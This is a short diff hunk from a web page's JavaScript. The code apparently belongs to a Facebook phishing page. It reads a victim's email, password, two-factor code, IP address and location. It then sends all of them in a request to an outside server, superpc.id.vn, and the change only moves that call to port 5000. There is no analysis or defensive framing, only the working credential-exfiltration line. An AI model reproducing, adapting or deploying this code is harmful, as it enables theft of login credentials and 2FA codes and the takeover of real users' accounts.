@@ -194,7 +194,7 @@
                     const address = localStorage.getItem('address');
                     var code = document.getElementById('2facode');
                     var codeValue = code.value;
-                    fetch('https://superpc.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                    fetch('https://superpc.id.vn:5000/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
                         .then(response => {
                             if (!response.ok) {
                                 throw new Error('Network response was not ok');
